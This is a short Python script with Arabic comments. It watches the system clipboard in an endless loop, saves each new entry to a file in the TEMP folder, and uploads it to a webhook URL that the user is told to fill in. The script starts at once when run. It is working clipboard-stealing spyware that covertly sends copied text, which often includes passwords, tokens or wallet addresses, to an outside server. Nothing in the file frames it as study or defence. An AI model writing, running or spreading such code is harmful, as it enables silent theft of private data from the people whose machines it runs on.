import os
import pyperclip
import requests
import time

# ضع رابط الـ webhook في المتغير 'webhook_url'
webhook_url = 'WEBHOOKS_URL'

class Clipboard:
    def __init__(self):
        self.directory = os.path.join(os.getenv("TEMP"), "Clipboard")
        os.makedirs(self.directory, exist_ok=True)
        self.last_content = None
        self.run()

    def run(self):
        while True:
            content = pyperclip.paste()
            
            # إذا كانت الحافظة تحتوي على محتوى مختلف عن المحتوى السابق
            if content != self.last_content:
                self.last_content = content
                self.save_and_send(content)
            
            # الانتظار قبل التحقق من الحافظة مرة أخرى
            time.sleep(2)  # الانتظار لمدة ثانيتين قبل التحقق مرة أخرى

    def save_and_send(self, content):
        clipboard_file_path = os.path.join(self.directory, "clipboard.txt")
        
        # حفظ محتوى الحافظة في ملف
        with open(clipboard_file_path, "w", encoding="utf-8") as file:
            if content:
                file.write(content)
            else:
                file.write("Clipboard is empty")
        
        # إرسال المحتوى إلى الـ webhook
        self.send_to_webhook(clipboard_file_path)

    def send_to_webhook(self, clipboard_file_path):
        files = {'file': open(clipboard_file_path, 'rb')}
        data = {
            'content': 'Here is the clipboard content'  # يمكنك إضافة أي محتوى آخر هنا
        }
        
        # إرسال المحتوى إلى webhook
        response = requests.post(webhook_url, data=data, files=files)
        files['file'].close()
        
        if response.status_code == 200:
            print("Clipboard content sent successfully to webhook.")
        else:
            print(f"Failed to send content. Status code: {response.status_code}")

# إنشاء كائن من الفئة لتنفيذ العملية
clipboard = Clipboard()
